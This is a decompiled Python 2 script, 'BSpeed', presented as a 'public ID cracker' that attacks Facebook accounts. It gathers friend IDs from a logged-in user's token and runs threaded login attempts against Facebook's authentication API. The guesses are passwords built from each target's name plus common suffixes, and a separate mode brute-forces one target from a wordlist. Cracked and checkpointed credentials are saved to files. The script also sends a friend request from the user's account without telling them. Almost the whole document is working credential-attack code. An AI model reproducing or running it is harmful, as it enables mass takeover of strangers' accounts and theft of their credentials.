
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Source File : .bspeed.py
# Time : Wed Sep  9 08:29:10 2020
#---------------------------------------
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <tahm1d>
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo = "\n\x1b[1;91m       \xe2\x99\xa6\xe2\x99\xa6\xe2\x99\xa6\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\x1b[1;96m\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\x1b[1;94m\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\x1b[1;93m\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x99\xa6\xe2\x99\xa6\xe2\x99\xa6\n\x1b[1;91m,-.   ,-.  ;-.  ,--. ,--. ,-.  \n\x1b[1;92m|  ) (   ` |  ) |    |    |  \\ \n\x1b[1;91m|-<   `-.  |-'  |-   |-   |  |    \n\x1b[1;92m|  ) .   ) |    |    |    |  / \n\x1b[1;91m`-'   `-'  '    `--' `--' `-'  \x1b[1;95m  BOTOLBABA\n\xe2\x99\xa6\xe2\x99\xa6\xe2\x99\xa6\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\x1b[1;93m\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\x1b[1;94m\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\x1b[1;96m\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x80\x94\xe2\x99\xa6\xe2\x99\xa6\xe2\x99\xa6\n"

def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print ' '
jalan('\x1b[1;93m ')
jalan('\x1b[1;91m,-.   ,-.  ;-.  ,--. ,--. ,-.  ')
jalan('\x1b[1;92m|  ) (   ` |  ) |    |    |  \\ ')
jalan("\x1b[1;91m|-<   `-.  |-'  |-   |-   |  | ")
jalan('\x1b[1;92m|  ) .   ) |    |    |    |  / ')
jalan("\x1b[1;91m`-'   `-'  '    `--' `--' `-'    ")
jalan('\x1b[1;96m ')
print '\x1b[1;90m        PUBLIC ID CRACKER BY \x1b[1;96mBOTOL BABA'
print '\x1b[1;97m--------------------------------------------------'
print '\x1b[1;95m'
print ' AUTHOR     : MEHEDI HASAN ARIYAN'
print ' FACEBOOK   : FACEBOOK.COM/THEMEHTAN'
print ' YOUTUBE    : YOUTUBE.COM/MASTERTRICK1'
print ' GITHUB     : GITHUB.COM/BOTOLMEHEDI'
print '\x1b[1;32m'
print '--------------------------------------------------'
jalan('\x1b[1;97m')
print '\n\x1b[1;96mFIRST OF ALL SUBSCRIBE OUR YOUTUBE CHANNEL'
time.sleep(1)
os.system('xdg-open https://www.Youtube.com/mastertrick1')
time.sleep(1)
raw_input('\n\x1b[1;96mPRESS ENTER TO OPEN MAIN MENU..')

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 50 * '\x1b[1;96m\xe2\x96\xaa'
        print '          \x1b[1;97m[\xe2\x97\x89] \x1b[1;96mLogin New Fresh Account \x1b[1;97m[\xe2\x97\x89]'
        id = raw_input('          \x1b[1;97m[\xe2\x97\x89] \x1b[1;97mID/Email \x1b[1;91m: \x1b[1;92m')
        pwd = raw_input('          \x1b[1;97m[\xe2\x97\x89] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;36;40m[\xe2\x9c\x93] Login Successful...'
                os.system('xdg-open http://www.www.facebook.com/TheMehtan')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;97m[!] There is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;97m[!] Your Account is on Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;97mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print '\x1b[1;97mYour Account is on Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97mThere is no internet connection'
        keluar()

    os.system('clear')
    print logo
    print '   \x1b[1;36;40m      \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;32;40m[*] Name\x1b[1;32;40m: ' + nama + '  \t   \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;34;40m[*] ID  \x1b[1;34;40m: ' + id + '        \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x91\x1b[1;34;40m[*] Subs\x1b[1;34;40m: ' + sub + '                      \x1b[1;36;40m\xe2\x95\x91'
    print '   \x1b[1;36;40m      \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;32;40m[1] \x1b[1;33;40m\xe2\x95\x90\xe2\x95\x90Start Cra3king'
    print '\x1b[1;32;40m[2] \x1b[1;33;40m\xe2\x95\x90\xe2\x95\x90Update BSpeed'
    print '\x1b[1;32;40m[0] \x1b[1;33;40m\xe2\x95\x90\xe2\x95\x90Log out'
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;31;40m>>> \x1b[1;35;40m')
    if unikers == '':
        print '\x1b[1;97mFill in correctly'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
        os.system('clear')
        print logo
        print ' \x1b[1;36;40m\xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n'
        os.system('git pull origin master')
        raw_input('\n\x1b[1;97m[ \x1b[1;97mBack \x1b[1;97m]')
        menu()
    elif unikers == '0':
        jalan('Token Removed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97mFill in correctly'
        pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;32;40m[1] \x1b[1;33;40m Hack From Friend List'
    print '\x1b[1;32;40m[2] \x1b[1;33;40m Hack From Public ID'
    print '\x1b[1;32;40m[3] \x1b[1;33;40m Hack Bruteforce'
    print '\x1b[1;32;40m[4] \x1b[1;33;40m Hack From File'
    print '\x1b[1;32;40m[0] \x1b[1;33;40m Back'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;97mFill in correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;97m[\xe2\x9c\xba] Getting IDs \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;97m[*] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;31;40m[\xe2\x9c\xba] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\xe2\x9c\xba] ID Not Found!'
                raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;97m]')
                super()

            print '\x1b[1;35;40m[\xe2\x9c\xba] Getting IDs...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;97m[+] \x1b[1;97mEnter the file name \x1b[1;97m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
                raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;97mFill in correctly'
            pilih_super()
        print '\x1b[1;36;40m[\xe2\x9c\xba] Total IDs : \x1b[1;97m' + str(len(id))
        jalan('\x1b[1;34;40m[\xe2\x9c\xba] Please Wait...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32;40m[\xe2\x9c\xba] Cloning\x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;97m        \xe2\x9d\x88     \x1b[1;97mTo Stop Process Press CTRL+Z \x1b[1;97m    \xe2\x9d\x88'
    print '   \x1b[1;31;48m\xe2\x97\x8f\xf0\x9f\x92\x8b\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xf0\x9f\x92\x8b\xe2\x97\x8f'
    jalan('                    \x1b[1;97mBSpeed start Cracking, Please Wait...')
    print '  \x1b[1;36;48m \xe2\x97\x8f\xf0\x9f\x92\x8b\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xf0\x9f\x92\x8b\xe2\x97\x8f'

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '786'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[Login Now] \x1b[1;97m ' + user + ' \x1b[1;97m | \x1b[1;97m ' + pass1 + ' \xf0\x9f\x91\xbd ' + b['name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m[After24Hr] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' \xf0\x9f\x91\xbd ' + b['name']
                cek = open('out/CP.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[Login Now] \x1b[1;97m ' + user + ' \x1b[1;97m | \x1b[1;97m ' + pass2 + ' \xf0\x9f\x91\xbd ' + b['name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m[After24Hr] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' \xf0\x9f\x91\xbd ' + b['name']
                    cek = open('out/CP.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[Login Now] \x1b[1;97m ' + user + ' \x1b[1;97m | \x1b[1;97m ' + pass3 + ' \xf0\x9f\x91\xbd ' + b['name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m[After24Hr] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' \xf0\x9f\x91\xbd ' + b['name']
                        cek = open('out/CP.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass4)
                    else:
                        pass4 = b['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[Login Now] \x1b[1;97m ' + user + ' \x1b[1;97m | \x1b[1;97m ' + pass4 + ' \xf0\x9f\x91\xbd ' + b['name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m[After24Hr] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' \xf0\x9f\x91\xbd ' + b['name']
                            cek = open('out/CP.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = '786786'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[Login Now] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' \xf0\x9f\x91\xbd ' + b['name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m[After24Hr] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' \xf0\x9f\x91\xbd ' + b['name']
                                cek = open('out/CP.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['last_name'] + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;97m[Login Now] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' \xf0\x9f\x91\xbd ' + b['name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;36;40m[After24Hr] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' \xf0\x9f\x91\xbd ' + b['name']
                                    cek = open('out/CP.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Pakistan'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[Login Now] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' \xf0\x9f\x91\xbd ' + b['name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;36;40m[After24Hr] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' \xf0\x9f\x91\xbd ' + b['name']
                                        cek = open('out/CP.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;97m....'
    print '\x1b[1;32;40m[+] Total OK/\x1b[1;97mCP \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
    print '\x1b[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
    print '\n\x1b[1;31;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f\n           '
    raw_input('\n\x1b[1;97m[\x1b[1;97mExit\x1b[1;97m]')
    super()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;31;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
        try:
            email = raw_input('\x1b[1;97m[+] \x1b[1;97mID\x1b[1;97m/\x1b[1;97mEmail \x1b[1;97mTarget \x1b[1;97m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;97m[+] \x1b[1;97mWordlist \x1b[1;97mext(list.txt) \x1b[1;97m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\x1b[1;31;40m \xe2\x97\x8f\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x84\xe2\x96\xba\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x97\x8f'
            print '\x1b[1;97m[\x1b[1;97m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mTarget \x1b[1;97m:\x1b[1;97m ' + email
            print '\x1b[1;97m[+] \x1b[1;97mTotal\x1b[1;97m ' + str(len(total)) + ' \x1b[1;97mPassword'
            jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;97m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;97m] \x1b[1;97mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;97m[+] \x1b[1;97mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\n\x1b[1;97m[+] \x1b[1;97mFounded.'
